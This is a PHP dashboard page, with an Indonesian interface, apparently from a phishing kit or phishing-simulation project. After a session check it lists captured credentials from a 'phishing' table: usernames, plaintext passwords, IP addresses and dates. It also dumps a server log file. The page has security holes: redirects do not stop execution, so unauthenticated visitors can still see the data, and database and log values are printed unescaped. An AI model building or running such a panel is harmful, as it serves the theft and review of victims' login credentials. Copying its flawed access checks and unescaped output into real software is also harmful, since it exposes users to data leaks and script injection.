<?php 
	session_start();

	if($_SESSION['level']==""){
		header("location:../../index.php");
	}elseif ($_SESSION['level']=="admin" || $_SESSION['level']=="Admin"){
		header("location:halaman_admin.php");
	}

?>

<!DOCTYPE html>
<html>
<head>
	<title>Halaman User </title>

	<style>
	div.ex1 {
		  /*background-color: gray;*/
		  width: 600px;
		  height: 500px;
		  overflow: scroll;
	}
</style>
</head>
<body>
	<?php 

	if($_SESSION['level']==""){
		header("location:../../index.php");
	}

	?>
	<h1>Halaman User</h1>

	<p>Halo <b><?php echo $_SESSION['username']; ?></b> anda login sebagai grup <b><?php echo $_SESSION['level']; ?></b><br>
	<a href="logout.php">LOGOUT</a>

	<br/>
	<br/>
<hr><hr>


	<br/>
	<a class="tombol" href="generateTOTP.php">+ Ganti Token TOTP untuk user [<?php echo $_SESSION['username']; ?>]</a>
 

	<h3>Data PHISHING</h3>
	<table border="1" class="table">
		<tr>
			<th>id</th>
			<th>Username</th>
			<th>Password</th>
			<th>IP</th>
            <th>Date</th>	
		</tr>

		<?php 
		include '../DB.php';

		$data = mysqli_query($conn,"SELECT * FROM phishing");
		while($d = mysqli_fetch_array($data)){
			?>
			<tr>
				<td><?php echo $d['id']; ?></td>
				<td><?php echo $d['username']; ?></td>
				<td><?php echo $d['password']; ?></td>
				<td><?php echo $d['ip']; ?></td>
				<td><?php echo $d['date']; ?></td>
			</tr>
			<?php 
		}
		?>

	</table>

	<h3>LOG FILE</h3>

        <div class="ex1">
        <?php
                $tabChar = '&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;';
                $myfile = fopen("../../../scripts/logs.txt", "r") or die("Unable to open file!");
                        while(!feof($myfile)) {
                                $line = fgets($myfile);
                                $parsing = str_replace("\t",$tabChar,$line);
                                echo $parsing."<br>";
                        }
                fclose($myfile);
        ?>
        </div>
</body>
</html>
